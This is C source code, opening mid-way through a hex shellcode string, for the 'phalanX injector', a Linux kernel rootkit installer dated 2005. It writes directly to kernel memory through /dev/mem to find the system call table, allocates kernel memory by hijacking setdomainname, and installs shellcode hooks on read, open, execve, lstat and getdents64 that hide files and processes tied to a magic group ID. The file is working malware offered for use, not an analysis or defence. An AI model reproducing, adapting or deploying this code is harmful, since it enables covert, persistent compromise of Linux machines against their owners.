x41\x41\xB8\x02\x00\x00\x00\x89\xF2\xFF\xD7\x89\xC2\x8B\x44\x24\x08\x8B\x7C\x24\x0C\x81\xC4\x10\x00\x00\x00\x89\xD1\x81\xE1\x00\x00\x00\xF0\xC1\xE9\x1C\x80\xF9\x0C\x75\x2A\x81\xFA\x00\x00\x00\x00\x74\x22\x8D\x8A\x58\x02\x00\x00\x8D\x92\x80\x00\x00\x00\x81\x3A\xE9\xA2\x00\x00\x0F\x84\x31\xFF\xFF\xFF\x81\xC2\x04\x00\x00\x00\x39\xCA\x72\xEA\xBE\x55\x55\x55\x55\xFF\xE6\xC3"
#define OPEN_GIDADR 50
#define OPEN_FADR 219
#define OPEN_OADR 307


#define KMALLOC "\x81\xEC\x08\x00\x00\x00\xB8\x00\x10\x00\x00\xBA\xD0\x00\x00\x00\x89\x04\x24\x89\x54\x24\x04\xB9\xC1\x80\x13\xC0\xFF\xD1\x81\xC4\x08\x00\x00\x00\xC3"
//allocate a page in the kernel


#define AF_INET 2


struct
{
  unsigned short limit;
  unsigned int base;
} __attribute__ ((packed)) idtr;


struct
{
  unsigned short off1;
  unsigned short sel;
  unsigned char none, flags;
  unsigned short off2;
} __attribute__ ((packed)) idt;


void
t_out (void)
{
  printf ("[FAILED]\nNO SOUP FOR YOU\n");
  exit (1);
}

unsigned long
find_symbol (char *symbol, void *base, int size)
{
  char srch[512];
  unsigned long kstrtab, x, i = 0;
  srch[0] = '\0';
  int emchan_last = 0;
  memcpy (srch + 1, symbol, size);
  srch[size] = '\0';

//  printf ("locating %s", symbol);

  printf ("%c%s; 0x", 0x0d, symbol);

  for (x = 0; x < 20 * 1024 * 1024; x++, i++)
    {

      if (i % 500000 == 0)
	write (1, "?", 1);

      else if (i == 4000001)
	{
	  write (1, "\b\b\b\b\b\b\b\b        \b\b\b\b\b\b\b\b", 24);
	  i = 0;
	}

      if (memcmp ((unsigned char *) (base + x), srch, size) == 0)
	{
	  kstrtab = KERNEL_START + x + 1;
	  printf("emchan: Found %08x for %s\n", kstrtab, (unsigned char*) (base + x + 1));
	  break;
	}
    }

  for (x = 0; x < 20 * 1024 * 1024; x++, i++)
    {
      if (i % 500000 == 0)
	write (1, "?", 1);

      else if (i == 4000001)
	{
	  write (1, "\b\b\b\b\b\b\b\b        \b\b\b\b\b\b\b\b", 24);
	  i = 0;
	}

      if (*(unsigned long *) (base + x) == kstrtab)
	{
	//emchan	
	if(emchan_last)
		return *(unsigned long *) (base + x - 4);
	
	emchan_last = 1;
#if 0
	printf("E: %08x %08x %08x\n", 
		*(unsigned long *) (base + x - 4),
		*(unsigned long *) (base + x - 0),
		*(unsigned long *) (base + x + 4));
#endif
	}
    }

  return 0;
}


unsigned long
findloc (void *bla, unsigned long val)
{
  int x;

  for (x = 0; x < 20 * 1024 * 1024; x++)
    {
      if (*(unsigned long *) (bla + x) == val)
	return x + KERNEL_START;
    }

  return 0;
}

void
replace (char *s, unsigned long count)
{
  unsigned long tmp;
  char *p = SUFFIX;

  count += s;



  while (s < count)
    {

      if (*(unsigned long *) s == 41705)
	{
	  *(s + 3) = ((HAXORGID) & 0xff000000) >> 24;
	  *(s + 2) = ((HAXORGID) & 0x00ff0000) >> 16;
	  *(s + 1) = ((HAXORGID) & 0x0000ff00) >> 8;
	  *(s + 0) = ((HAXORGID) & 0x000000ff);
	}

      if (*(unsigned long *) s == 0x3168702e)
	{
	  *(s + 0) = *(p);
	  *(s + 1) = *(p + 1);
	  *(s + 2) = *(p + 2);
	  *(s + 3) = *(p + 3);
	}

      s++;
    }

}

#if 0
unsigned long
find_tcp4_seq_show (void *bla)
{
  unsigned long nignuglet, x, i = 0;

  printf ("%ctcp4_seq_show; 0x");

  for (x = 0; x < 20 * 1024 * 1024; x++, i++)
    {
      if (i % 500000 == 0)
	write (1, "?", 1);

      else if (i == 4000001)
	{
	  write (1, "\b\b\b\b\b\b\b\b        \b\b\b\b\b\b\b\b", 24);
	  i = 0;
	}

      if (memcmp ((unsigned char *) (bla + x), "tcp\x00", 4) == 0)
	{
	  nignuglet = x + 0xc0000000;
	  break;
	}

    }


  for (x = 0; x < 20 * 1024 * 1024; x++, i++)
    {
      if (i % 500000 == 0)
	write (1, "?", 1);

      else if (i == 4000001)
	{
	  write (1, "\b\b\b\b\b\b\b\b        \b\b\b\b\b\b\b\b", 24);
	  i = 0;
	}

      if (*(unsigned long *) (bla + x) == nignuglet)
	if (*(unsigned long *) (bla + x + 4) == AF_INET)
	  return *(unsigned long *) (bla + x + 8);

    }


  return 0;
}
#endif

int
main (int argc, char *argv[])
{
#if 0
  unsigned long system_call, sys_call_table, kmalloc, setdomainname,
    call_usermodehelper, sys_read, sys_lstat, sys_lstat64, sys_getdents64,
    sys_exit, find_task_by_pid_type = 0, find_task_by_pid =
    0, tcp4_seq_show, tcp4_seq_show_loc, sys_open, sys_close, sys_write,
    sys_ioctl, sys_getgid, sys_getpid, sys_execve;
#endif

  unsigned long system_call, sys_call_table, kmalloc, setdomainname,
    call_usermodehelper, sys_read, sys_lstat, sys_lstat64, sys_getdents64,
    sys_exit, find_task_by_pid_type = 0, find_task_by_pid =
    0, sys_open, sys_close, sys_write,
    sys_ioctl, sys_getgid, sys_getpid, sys_execve;
  int x = 0, y, z, i, fd, status, task_by_pid_type = -1, regparm = 0;
  void *bla;
  struct utsname sys;
  char *p, backup[10000], temp[1024], *cum_ptr;
  unsigned long space, space2, space3, space4, space5, space6, space7;

  cum_ptr = temp + 150;

  setvbuf (stdout, NULL, _IONBF, 0);


  printf ("____________________________\n");
  printf
    ("|\33[1;37m\33[1;44m phalanX injector beta 6  \33[1;37m\33[1;35m\33[1;37m\33[0m|\n");
  printf
    ("|\33[1;37m\33[1;44m %%rebel%% .  november 2005 \33[1;37m\33[1;35m\33[1;37m\33[0m|\n");
  printf ("----------------------------\n");


  if (argc != 2 || (*(*(argv + 1)) != 'i' && *(*(argv + 1)) != 'u'))
    {
      printf ("install: %s i\n", argv[0]);
      printf ("uninstall: %s u\n", argv[0]);

      exit (0);
    }

  uname (&sys);

  p = strtok (sys.release, ".");
  p = strtok (0, ".");
  p = strtok (0, ".");
  if (*(p + 1) >= 0x30 && *(p + 1) <= 0x39)
    *(p + 2) = '\0';
  else
    *(p + 1) = '\0';



  fd = open ("/dev/mem", O_RDWR);

  if (fd < 3)
    {
      dup2 (fd, 3);
      close (fd);
      fd = 3;
    }


  bla = mmap (0, 500 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);

asm ("sidt %0":"=m" (idtr));

  printf ("idt_table; 0x%.08x\n", idtr.base);

  system_call =
    (*(short *) (bla + (idtr.base & 0x00ffffff) + (8 * 0x80) + 6) << 16) |
    *(short *) (bla + (idtr.base & 0x00ffffff) + (8 * 0x80) + 0);

//printf("system_call; 0x%.08x\n",system_call);

  for (x = 0; x < 500; x++)
    {
      if (*(unsigned char *) (bla + (system_call & 0x00ffffff) + x) == 0xff)
	if (*(unsigned char *) (bla + (system_call & 0x00ffffff) + x + 1) ==
	    0x14)
	  if (*(unsigned char *) (bla + (system_call & 0x00ffffff) + x + 2) ==
	      0x85)
	    {
	      sys_call_table =
		*(int *) (bla + (system_call & 0x00ffffff) + x + 3);
	      break;
	    }

    }

  printf ("sys_call_table; 0x%08x\n", sys_call_table);
  sys_open =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 5));

/*printf("OPEN_TYPE = %s\n\nsys_open = %s\n\n",OPEN_TYPE,(unsigned char *) (bla + (sys_open - KERNEL_START)));
if(memcmp((unsigned char *) (bla + (sys_open - KERNEL_START)),OPEN_TYPE,20) == 0)
{
printf("phalanx is already residing in the kernel. thank you.\n");
exit(1);
}*/



  kmalloc = find_symbol ("__kmalloc", bla, strlen ("__kmalloc") + 2);
  printf("kmalloc at: %08x\n", kmalloc);

  if (kmalloc == 0)
    {
      printf ("%ccouldn't find kmalloc\n", 0x0d);
      exit (1);
    }

  printf ("%c__kmalloc; 0x%.08x                    \n", 0x0d, kmalloc);


  if (atoi (p) >= 13)
    {
      call_usermodehelper =
	find_symbol ("call_usermodehelper_keys", bla,
		     strlen ("call_usermodehelper_keys") + 2);
      printf ("%ccall_usermodehelper_keys; 0x%.08x                        \n",
	      0x0d, call_usermodehelper);
    }


  else
    {
      call_usermodehelper =
	find_symbol ("call_usermodehelper", bla,
		     strlen ("call_usermodehelper") + 2);
      printf ("%ccall_usermodehelper; 0x%.08x                        \n",
	      0x0d, call_usermodehelper);
    }

  if (call_usermodehelper == 0)
    {
      printf ("%ccouldn't find call_usermodehelper\n", 0x0d);
      exit (1);
    }

  uname (&sys);

  if (atoi (p) >= 13 && strstr (sys.release, "FC") != NULL)
    regparm = 1;



  find_task_by_pid_type =
    find_symbol ("find_task_by_pid_type", bla,
		 strlen ("find_task_by_pid_type") + 2);

  if (find_task_by_pid_type == 0)
    {
      //  printf ("\x0dcouldn't find find_task_by_pid_type\n");
      printf ("                        ");
      find_task_by_pid =
	find_symbol ("find_task_by_pid", bla,
		     strlen ("find_task_by_pid") + 2);
      if (find_task_by_pid != 0)
	printf ("%cfind_task_by_pid; 0x%.08x                  \n", 0x0d,
		find_task_by_pid);
    }

  else
    printf ("%cfind_task_by_pid_type; 0x%.08x              \n", 0x0d,
	    find_task_by_pid_type);

  if (find_task_by_pid == 0 && find_task_by_pid_type == 0)
    {
      printf ("\ncouldn't find find_task_by_pid either :(\n");
      exit (0);
    }

//emchan
  printf("emchan");
#if 0
  tcp4_seq_show = find_tcp4_seq_show (bla);

  tcp4_seq_show_loc = findloc (bla, tcp4_seq_show);

  if (tcp4_seq_show == 0 || tcp4_seq_show_loc == 0)
    {
      printf ("\ncouldn't find tcp4_seq_show\n");
      exit (0);
    }

  printf ("%ctcp4_seq_show; 0x%.08x\n", 0x0d, tcp4_seq_show);
#endif

//call_usermodehelper = 0x10101010;

  memcpy (temp, KMALLOC, sizeof (KMALLOC) - 1);

  temp[27] = (kmalloc & 0xff000000) >> 24;
  temp[26] = (kmalloc & 0x00ff0000) >> 16;
  temp[25] = (kmalloc & 0x0000ff00) >> 8;
  temp[24] = (kmalloc & 0x000000ff);

  setdomainname =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 121));
  sys_read =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 3));
  sys_lstat =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 107));
  sys_lstat64 =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 196));
  sys_getdents64 =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 220));
  sys_exit =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 1));
  sys_open =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 5));
  sys_write =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 4));
  sys_close =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 6));
  sys_ioctl =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 54));
  sys_getgid =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 47));
  sys_getpid =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 20));
  sys_execve =
    *(unsigned long *) (bla + (sys_call_table - 0xc0000000) + (4 * 11));



  if (*(*(argv + 1)) == 'u')
    {
      printf
	("uninstalling phalanx from the kernel\nhow can you live with yourself? you disgust me.\n");

      printf ("restoring read..\n");
      lseek (fd, (sys_read - KERNEL_START) + 1337, SEEK_SET);
      read (fd, &sys_read, 4);
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 3), SEEK_SET);
      write (fd, &sys_read, 4);

      printf ("restoring lstat64..\n");
      lseek (fd, (sys_lstat64 - KERNEL_START) + 1337, SEEK_SET);
      read (fd, &sys_lstat64, 4);
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 196), SEEK_SET);
      write (fd, &sys_lstat64, 4);

      printf ("restoring lstat..\n");
      lseek (fd, (sys_lstat - KERNEL_START) + 1337, SEEK_SET);
      read (fd, &sys_lstat, 4);
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 107), SEEK_SET);
      write (fd, &sys_lstat, 4);

      printf ("restoring getdents64..\n");
      lseek (fd, (sys_getdents64 - KERNEL_START) + 1337, SEEK_SET);
      read (fd, &sys_getdents64, 4);
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 220), SEEK_SET);
      write (fd, &sys_getdents64, 4);

      printf ("restoring open..\n");
      lseek (fd, (sys_open - KERNEL_START) + 1337, SEEK_SET);
      read (fd, &sys_open, 4);
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 5), SEEK_SET);
      write (fd, &sys_open, 4);

//emchan
#if 0
      printf ("restoring tcp_seq_show..\n");
      lseek (fd, (space - KERNEL_START) + 1337 + 8, SEEK_SET);
      read (fd, &tcp4_seq_show_loc, 4);
      lseek (fd, (space - KERNEL_START) + 1337 + 4, SEEK_SET);
      read (fd, &tcp4_seq_show, 4);
      lseek (fd, (tcp4_seq_show_loc - KERNEL_START), SEEK_SET);
      write (fd, &tcp4_seq_show, 4);
#endif


      printf ("why do you run away?!? THAT'S WHAT DADDY DID!!!\n");

      exit (0);
    }


//printf("setdomainname; 0x%.08x\n",setdomainname);
/*printf("sys_read; 0x%.08x\n",sys_read);
printf("sys_lstat; 0x%.08x\n",sys_lstat);
printf("sys_lstat64; 0x%.08x\n",sys_lstat64);
printf("sys_getdents64; 0x%.08x\n",sys_getdents64);*/
//printf("sys_open; 0x%.08x\n",sys_open);

//printf("backing up setdomainname..\n");
  memcpy (&backup, (unsigned char *) (bla + (setdomainname - 0xc0000000)),
	  sizeof (KMALLOC) - 1);

//printf("overwriting with call to kmalloc..\n");
  lseek (fd, (setdomainname - 0xc0000000), SEEK_SET);
  write (fd, temp, sizeof (KMALLOC) - 1);

//printf("calling our kmalloc wrapper..\n");
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space2));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space3));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space4));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space5));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space6));
asm ("movl $0x79,%%eax;int $0x80;movl %%eax, %0\n":"=r" (space7));


//printf("freshly allocated kernel memory; 0x%.08x 0x%.08x 0x%.08x 0x%.08x 0x%.08x 0x%.08x\n",space, space2, space3, space4, space5, space6);

//backup the original syscall addresses
  lseek (fd, (space - KERNEL_START) + 1337, SEEK_SET);
  write (fd, &sys_read, 4);

  lseek (fd, (space2 - KERNEL_START) + 1337, SEEK_SET);
  write (fd, &sys_lstat64, 4);

  lseek (fd, (space3 - KERNEL_START) + 1337, SEEK_SET);
  write (fd, &sys_lstat, 4);

  lseek (fd, (space4 - KERNEL_START) + 1337, SEEK_SET);
  write (fd, &sys_getdents64, 4);

  lseek (fd, (space6 - KERNEL_START) + 1337, SEEK_SET);
  write (fd, &sys_open, 4);



//printf("restoring setdomainname code..\n");
  lseek (fd, (setdomainname - KERNEL_START), SEEK_SET);
  write (fd, backup, sizeof (KMALLOC) - 1);



  printf ("testing the userland process spawning code..");

  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 121), SEEK_SET);
  write (fd, &space, 4);

//just to be safe
  if (access ("/usr/bin/touch", F_OK) == -1)
    {

      if (access ("/bin/touch", F_OK) == -1)
	{
	  printf
	    ("this box is missing /bin/touch?!\nhey what's going on here\n");
	  exit (1);
	}

      symlink ("/bin/touch", "/usr/bin/touch");
    }


  if (regparm == 0)
    memcpy (temp, TOUCH, sizeof (TOUCH) - 1);

  else
    memcpy (temp, TOUCH_REGPARM, sizeof (TOUCH_REGPARM) - 1);

  *(cum_ptr + 3) = ((call_usermodehelper) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((call_usermodehelper) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((call_usermodehelper) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((call_usermodehelper) & 0x000000ff);

  lseek (fd, (space - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (TOUCH) - 1);

  x = fork ();
  if (x == 0)
    {
      close (1);
      mknod ("/uNFuNF", S_IFIFO | 0666, 0);
      open ("/uNFuNF", O_RDONLY);
      exit (0);
    }

  if (fork () == 0)
    {
      close (1);
      __asm ("movl $0x79,%eax;int $0x80");
      exit (0);
    }

  signal (SIGALRM, t_out);
  alarm (10);
  waitpid (x, &status, 0);
  alarm (0);
  printf ("[OK]\n");


/*
  if (access ("/uNFuNF", F_OK) != -1)
    printf ("[OK]\n");

  if (access ("/uNFuNF", F_OK) == -1)
    {
      printf ("[FAILED]\nNO SOUP FOR YOU\n");
//printf("restoring setdomainname entry..\n");
      lseek (fd, (sys_call_table - KERNEL_START) + (4 * 121), SEEK_SET);
      write (fd, &setdomainname, 4);
      exit (1);
    }
*/


  unlink ("/uNFuNF");

//printf("restoring setdomainname entry..\n");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 121), SEEK_SET);
  write (fd, &setdomainname, 4);



//let's fucken roll
  printf ("hooking syscalls..");



  cum_ptr = temp + READ_RADR;
  if (regparm == 0)
    {
      memcpy (temp, READ, sizeof (READ) - 1);
      replace (temp, sizeof (READ) - 1);
    }

  else
    {
      memcpy (temp, READ_REGPARM, sizeof (READ_REGPARM) - 1);
      replace (temp, sizeof (READ_REGPARM) - 1);
    }



  *(cum_ptr + 3) = ((sys_read) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_read) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_read) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_read) & 0x000000ff);

  cum_ptr = temp + READ_GIDADR;

  *(cum_ptr + 3) = ((sys_getgid) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getgid) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getgid) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getgid) & 0x000000ff);

  cum_ptr = temp + READ_PIDADR;

  *(cum_ptr + 3) = ((sys_getpid) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getpid) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getpid) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getpid) & 0x000000ff);

  cum_ptr = temp + READ_IADR;

  *(cum_ptr + 3) = ((sys_ioctl) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_ioctl) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_ioctl) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_ioctl) & 0x000000ff);

  cum_ptr = temp + READ_CADR;

  *(cum_ptr + 3) = ((call_usermodehelper) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((call_usermodehelper) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((call_usermodehelper) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((call_usermodehelper) & 0x000000ff);

  cum_ptr = temp + READ_EADR;

  *(cum_ptr + 3) = ((sys_exit) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_exit) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_exit) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_exit) & 0x000000ff);

  cum_ptr = temp + READ_OADR;

  *(cum_ptr + 3) = ((sys_open) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_open) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_open) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_open) & 0x000000ff);

  cum_ptr = temp + READ_WADR;

  *(cum_ptr + 3) = ((sys_write) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_write) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_write) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_write) & 0x000000ff);

  cum_ptr = temp + READ_CLADR;

  *(cum_ptr + 3) = ((sys_close) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_close) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_close) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_close) & 0x000000ff);



  lseek (fd, (space - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (READ) - 1);

  printf ("[read]..");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 3), SEEK_SET);
  write (fd, &space, 4);

//hook lstat64
  if (find_task_by_pid != 0 && find_task_by_pid_type == 0)
    find_task_by_pid_type = find_task_by_pid;

  cum_ptr = temp + LSTAT_LADR;

  memcpy (temp, LSTAT, sizeof (LSTAT) - 1);

  replace (temp, sizeof (LSTAT) - 1);


  *(cum_ptr + 3) = ((sys_lstat64) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_lstat64) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_lstat64) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_lstat64) & 0x000000ff);

  cum_ptr = temp + LSTAT_LADR2;
  *(cum_ptr + 3) = ((sys_lstat64) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_lstat64) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_lstat64) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_lstat64) & 0x000000ff);


  cum_ptr = temp + LSTAT_FADR;
  *(cum_ptr + 3) = ((find_task_by_pid_type) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((find_task_by_pid_type) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((find_task_by_pid_type) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((find_task_by_pid_type) & 0x000000ff);

  cum_ptr = temp + LSTAT_GIDADR;
  *(cum_ptr + 3) = ((sys_getgid) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getgid) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getgid) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getgid) & 0x000000ff);


  lseek (fd, (space2 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (LSTAT) - 1);

  printf ("[lstat64]..");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 196), SEEK_SET);
  write (fd, &space2, 4);

//hook lstat

  cum_ptr = temp + LSTAT_LADR;

  memcpy (temp, LSTAT, sizeof (LSTAT) - 1);
  replace (temp, sizeof (LSTAT) - 1);

  *(cum_ptr + 3) = ((sys_lstat) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_lstat) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_lstat) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_lstat) & 0x000000ff);

  cum_ptr = temp + LSTAT_FADR;
  *(cum_ptr + 3) = ((find_task_by_pid_type) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((find_task_by_pid_type) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((find_task_by_pid_type) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((find_task_by_pid_type) & 0x000000ff);

  lseek (fd, (space3 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (LSTAT) - 1);

  printf ("[lstat]..");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 107), SEEK_SET);
  write (fd, &space3, 4);


  cum_ptr = temp + EXECVE_EADR;

  memcpy (temp, EXECVE, sizeof (EXECVE) - 1);
  replace (temp, sizeof (EXECVE) - 1);

  *(cum_ptr + 3) = ((sys_execve) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_execve) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_execve) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_execve) & 0x000000ff);

  lseek (fd, (space7 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (EXECVE) - 1);

  printf ("[execve]..");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 11), SEEK_SET);
  write (fd, &space7, 4);


  if (find_task_by_pid != 0)
    memcpy (temp, GETDENTS64, sizeof (GETDENTS64) - 1);

  else if (find_task_by_pid_type != 0)
    memcpy (temp, GETDENTS64_TYPE, sizeof (GETDENTS64) - 1);

  replace (temp, sizeof (GETDENTS64) - 1);


  cum_ptr = temp + GETDENTS64_GADR;
  *(cum_ptr + 3) = ((sys_getdents64) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getdents64) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getdents64) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getdents64) & 0x000000ff);

  cum_ptr = temp + GETDENTS64_GIDADR;
  *(cum_ptr + 3) = ((sys_getgid) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getgid) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getgid) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getgid) & 0x000000ff);

  cum_ptr = temp + GETDENTS64_FADR;
  *(cum_ptr + 3) = ((find_task_by_pid_type) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((find_task_by_pid_type) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((find_task_by_pid_type) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((find_task_by_pid_type) & 0x000000ff);

  lseek (fd, (space4 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (GETDENTS64) - 1);

  printf ("[getdents64]..");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 220), SEEK_SET);
  write (fd, &space4, 4);


//back it up
//emchan
#if 0
  lseek (fd, (space - KERNEL_START) + 1337 + 4, SEEK_SET);
  write (fd, &tcp4_seq_show, 4);

  lseek (fd, (space - KERNEL_START) + 1337 + 8, SEEK_SET);
  write (fd, &tcp4_seq_show_loc, 4);

  memcpy (temp, TCP, sizeof (TCP) - 1);
  replace (temp, sizeof (TCP) - 1);

  cum_ptr = temp + TCP_TADR;

  *(cum_ptr + 3) = ((tcp4_seq_show) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((tcp4_seq_show) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((tcp4_seq_show) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((tcp4_seq_show) & 0x000000ff);

  printf ("[tcp4_seq_show]..");
  lseek (fd, (space5 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (TCP) - 1);
  lseek (fd, (tcp4_seq_show_loc - KERNEL_START), SEEK_SET);
  write (fd, &space5, 4);
#endif

  cum_ptr = temp + OPEN_OADR;

  memcpy (temp, OPEN_TYPE, sizeof (OPEN_TYPE) - 1);

  replace (temp, sizeof (OPEN_TYPE) - 1);


  *(cum_ptr + 3) = ((sys_open) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_open) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_open) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_open) & 0x000000ff);

  cum_ptr = temp + OPEN_FADR;
  *(cum_ptr + 3) = ((find_task_by_pid_type) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((find_task_by_pid_type) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((find_task_by_pid_type) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((find_task_by_pid_type) & 0x000000ff);

  cum_ptr = temp + OPEN_GIDADR;
  *(cum_ptr + 3) = ((sys_getgid) & 0xff000000) >> 24;
  *(cum_ptr + 2) = ((sys_getgid) & 0x00ff0000) >> 16;
  *(cum_ptr + 1) = ((sys_getgid) & 0x0000ff00) >> 8;
  *(cum_ptr + 0) = ((sys_getgid) & 0x000000ff);


  lseek (fd, (space6 - KERNEL_START), SEEK_SET);
  write (fd, temp, sizeof (OPEN_TYPE) - 1);

  printf ("[open]");
  lseek (fd, (sys_call_table - KERNEL_START) + (4 * 5), SEEK_SET);
  write (fd, &space6, 4);


  printf ("\n");

  close (fd);

  return 0;
}
